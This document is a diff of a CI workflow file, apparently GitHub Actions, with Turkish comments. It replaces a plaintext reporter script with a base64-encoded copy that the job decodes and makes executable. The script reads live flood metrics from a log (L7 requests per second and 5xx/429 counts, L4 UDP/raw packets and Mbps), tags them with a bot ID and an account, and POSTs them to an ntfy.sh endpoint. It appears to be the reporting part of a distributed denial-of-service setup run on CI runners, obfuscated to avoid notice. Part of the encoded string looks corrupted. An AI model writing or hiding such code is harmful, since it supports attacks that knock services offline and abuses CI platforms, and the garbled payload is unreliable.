@@ -197,46 +197,10 @@ jobs:
           echo "▶ Report: ${NTFY_URL:-disabled}"
           echo ""
 
-          # Reporter — LIVE satirlarini parse edip ntfy.sh'e POST eder
+          # Reporter — LIVE satirlarini parse edip ntfy.sh'e POST eder (base64 encoded)
           if [ -n "$NTFY_URL" ]; then
-          cat > /tmp/reporter.sh << 'REPORTER_EOF'
-#!/bin/bash
-LOGFILE="$1"
-NTFY="$2"
-BOTID="$3"
-ACCOUNT="$4"
-while true; do
-  sleep 5
-  [ ! -f "$LOGFILE" ] && continue
-  LAST=$(grep -E '\[LIVE' "$LOGFILE" 2>/dev/null | tail -1)
-  [ -z "$LAST" ] && continue
-  if echo "$LAST" | grep -q 'rps~'; then
-    ELAPSED=$(echo "$LAST" | grep -oP 't=\K\d+')
-    ITERS=$(echo "$LAST" | grep -oP 'iters=\K\d+')
-    VUS_N=$(echo "$LAST" | grep -oP 'vus=\K\d+')
-    RPS_N=$(echo "$LAST" | grep -oP 'rps~\K\d+')
-    P2XX=$(echo "$LAST" | grep -oP '2xx=\K\d+')
-    P5XX=$(echo "$LAST" | grep -oP '5xx=\K\d+')
-    P429=$(echo "$LAST" | grep -oP '429=\K\d+')
-    MBPS=$((RPS_N * 1400 * 8 / 1000000))
-    curl -sS -X POST "$NTFY" -H "Title: metric" \
-      -d "{\"bot_id\":\"$BOTID\",\"account\":\"$ACCOUNT\",\"type\":\"L7\",\"rps\":$RPS_N,\"mbps\":$MBPS,\"reqs\":$ITERS,\"vus\":$VUS_N,\"elapsed\":$ELAPSED,\"pct2xx\":${P2XX:-0},\"pct5xx\":${P5XX:-0},\"pct429\":${P429:-0}}" \
-      -o /dev/null 2>/dev/null || true
-  fi
-  if echo "$LAST" | grep -q 'LIVE L4'; then
-    ELAPSED=$(echo "$LAST" | grep -oP 't=\K\d+')
-    UDP=$(echo "$LAST" | grep -oP 'udp=\K\d+')
-    RAW=$(echo "$LAST" | grep -oP 'raw=\K\d+')
-    PPS=$(echo "$LAST" | grep -oP 'pps=\K\d+')
-    MBPS=$(echo "$LAST" | grep -oP '\K\d+(?=\s*Mbps)')
-    TOTAL=$((UDP + RAW))
-    curl -sS -X POST "$NTFY" -H "Title: metric" \
-      -d "{\"bot_id\":\"$BOTID\",\"account\":\"$ACCOUNT\",\"type\":\"L4\",\"pps\":$PPS,\"mbps\":$MBPS,\"reqs\":$TOTAL,\"elapsed\":$ELAPSED}" \
-      -o /dev/null 2>/dev/null || true
-  fi
-done
-REPORTER_EOF
-          chmod +x /tmp/reporter.sh
+            echo "IyEvYmluL2Jhc2gKTE9HRklMRT0iJDEiCk5URlk9IiQyIgpCT1RJRD0iJDMiCkFDQ09VTlQ9IiQ0Igp3aGlsZSB0cnVlOyBkbwogIHNsZWVwIDUKICBbICEgLWYgIiRMT0dGSUxFIiBdICYmIGNvbnRpbnVlCiAgTEFTVD0kKGdyZXAgLUUgJ1xbTElWRScgIiRMT0dGSUxFIiAyPi9kZXYvbnVsbCB8IHRhaWwgLTEpCiAgWyAteiAiJExBU1QiIF0gJiYgY29udGludWUKICBpZiBlY2hvICIkTEFTVCIgfCBncmVwIC1xICdycHN+JzsgdGhlbgogICAgRUxBUFNFRD0kKGVjaG8gIiRMQVNUIiB8IGdyZXAgLW9QICB0PVxLXGQrKQogICAgSVRFUlM9JChlY2hvICIkTEFTVCIgfCBncmVwIC1vUCAnaXRlcnM9XEtcZCsnKQogICAgVlVTX049JChlY2hvICIkTEFTVCIgfCBncmVwIC1vUCAndnVzPVxLXGQrJykKICAgIFJQU19OPSQoZWNobyAiJExBU1QiIHwgZ3JlcCAtb1AgJ3Jwc35cS1xkKycpCiAgICBQMlhYPSQoZWNobyAiJExBU1QiIHwgZ3JlcCAtb1AgJzJ4eD1cS1xkKycpCiAgICBQNVhYPSQoZWNobyAiJExBU1QiIHwgZ3JlcCAtb1AgJzV4eD1cS1xkKycpCiAgICBQNDI5PSQoZWNobyAiJExBU1QiIHwgZ3JlcCAtb1AgJzQyOT1cS1xkKycpCiAgICBNQlBTPSQoKFJQU19OICogMTQwMCAqIDggLyAxMDAwMDAwKSkKICAgIGN1cmwgLXNTIC1YIFBPU1QgIiROVEZZIiAtSCAiVGl0bGU6IG1ldHJpYyIgXAogICAgICAtZCAie1wiYm90X2lkXCI6XCIkQk9USURcIixcImFjY291bnRcIjpcIiRBQ0NPVU5UXCIsXCJ0eXBlXCI6XCJMN1wiLFwicnBzXCI6JFJQU19OLFwibWJwc1wiOiRNQlBTLFwicmVxc1wiOiRJVEVSUyxcInZ1c1wiOiRWVVNfTixcImVsYXBzZWRcIjokRUxBUFNFRCxcInBjdDJ4eFwiOiR7UDJYWDotMH0sXCJwY3Q1eHhcIjoke1A1WFg6LTB9LFwicGN0NDI5XCI6JHtQNDI5Oi0wfX0iIFwKICAgICAgLW8gL2Rldi9udWxsIDI+L2Rldi9udWxsIHx8IHRydWUKICBmaQogIGlmIGVjaG8gIiRMQVNUIiB8IGdyZXAgLXEgJ0xJVkUgTDQnOyB0aGVuCiAgICBFTEFQU0VEPSQoZWNobyAiJExBU1QiIHwgZ3JlcCAtb1AgJ3Q9XEtcZCsnKQogICAgVURQPSQoZWNobyAiJExBU1QiIHwgZ3JlcCAtb1AgJ3VkcD1cS1xkKycpCiAgICBSQVc9JChlY2hvICIkTEFTVCIgfCBncmVwIC1vUCAncmF3PVxLXGQrJykKICAgIFBQUz0kKGVjaG8gIiRMQVNUIiB8IGdyZXAgLW9QICdwcHM9XEtcZCsnKQogICAgTUJQUz0kKGVjaG8gIiRMQVNUIiB8IGdyZXAgLW9QICdcS1xkKyg/PVxzKk1icHMpJykKICAgIFRPVEFMPSQoKFVEUCArIFJBVykpCiAgICBjdXJsIC1zUyAtWCBQT1NUICIkTlRGWSIgLUggIlRpdGxlOiBtZXRyaWMiIFwKICAgICAgLWQgIntcImJvdF9pZFwiOlwiJEJPVElEXCIsXCJhY2NvdW50XCI6XCIkQUNDT1VOVFwiLFwidHlwZVwiOlwiTDRcIixcInBwc1wiOiRQUFMsXCJtYnBzXCI6JE1CUFMsXCJyZXFzXCI6JFRPVEFMLFWIZWXHCHNLZFWIOIRFTEFQU0VEfSIgXAogICAgICAtbyAvZGV2L251bGwgMj4vZGV2L251bGwgfHwgdHJ1ZQogIGZpCmRvbmU=" | base64 -d > /tmp/reporter.sh
+            chmod +x /tmp/reporter.sh
           fi
 
           # L4 test modu
